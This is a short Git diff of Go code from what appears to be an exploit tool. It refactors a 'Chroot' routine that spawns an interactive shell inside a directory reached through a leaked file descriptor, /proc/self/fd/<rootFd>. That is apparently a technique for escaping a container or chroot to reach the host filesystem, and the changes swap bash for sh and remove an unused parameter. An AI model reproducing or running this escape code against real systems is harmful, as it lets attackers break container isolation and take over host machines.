@@ -73,8 +73,9 @@ func (v Vulnerability) GetFd(inode int, ref string) (fd int, err error) {
 	return
 }
 
-func (v Vulnerability) Chroot(rootFd int, ref string) (err error) {
-	cmd := exec.Command("/bin/bash")
+func (v Vulnerability) Chroot(rootFd int) (err error) {
+	shell := "/bin/sh"
+	cmd := exec.Command(shell)
 	cmd.Dir = fmt.Sprintf("/proc/self/fd/%d", rootFd)
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
@@ -102,7 +103,7 @@ func (v Vulnerability) Exploit(context *cli.Context) (err error) {
 		return
 	}
 	if fi.IsDir() {
-		err = v.Chroot(fd, ref)
+		err = v.Chroot(fd)
 		if err != nil {
 			return
 		}
